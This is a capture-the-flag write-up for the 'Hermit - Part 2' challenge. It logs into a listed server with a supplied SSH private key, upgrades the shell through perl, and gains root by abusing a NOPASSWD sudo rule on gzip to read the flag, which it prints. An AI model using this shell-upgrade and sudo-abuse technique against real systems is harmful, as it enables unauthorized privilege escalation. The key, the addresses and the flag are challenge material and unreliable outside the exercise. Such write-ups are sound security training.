# Hermit - Part 2

>Who are you? How did you get here? You better zip on out of here or else.
>
>104.197.195.221:8087 34.121.84.161:8087
>
>Created by Cobchise#6969
>
>(The server is likely not broken. If you really think it's broken, create a support ticket.)

>## Hint1 
>Try enumeration

>## Hint2
>The port you are looking for has been forwarded to 8087.

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBJ6WTDqSNvZK2tVS8m8PojEl8gFcYdKteOlsTFa1+2UwAAAJClUMQIpVDE
CAAAAAtzc2gtZWQyNTUxOQAAACBJ6WTDqSNvZK2tVS8m8PojEl8gFcYdKteOlsTFa1+2Uw
AAAECtACFT0GlKU1unqP8hNu9C2FOx8hu89x9Mpksn3uSy7EnpZMOpI29kra1VLybw+iMS
XyAVxh0q146WxMVrX7ZTAAAADXNoaXRyaXhAbG9jYWw=
-----END OPENSSH PRIVATE KEY-----
```


```bash
$ cat id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEnpZMOpI29kra1VLybw+iMSXyAVxh0q146WxMVrX7ZT hermit@local
```

```bash
$ ssh -i id_ed25519 hermit@104.197.195.221 -p 8087
Linux 162d488eac13 4.19.0-16-cloud-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 28 15:14:43 2021 from 180.150.57.6
-sh: 35: set: Illegal option -o history
$ whoami
hermit
```

## upgrading shell
```
$ which python3
$ which python
$ which perl
/usr/bin/perl

$ perl -e 'exec("/bin/bash")'
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LANG = "en_CA.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
hermit@162d488eac13:~/flag$ 

```

## sudo -l

```bash
hermit@162d488eac13:~/flag$ sudo -l
Matching Defaults entries for hermit on 162d488eac13:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hermit may run the following commands on 162d488eac13:
    (ALL : ALL) ALL
    (root) NOPASSWD: /bin/gzip -f /root/rootflag.txt -t

hermit@162d488eac13:~/flag$ sudo /bin/gzip -f /root/rootflag.txt -t
UMASS{a_test_of_integrity}
```
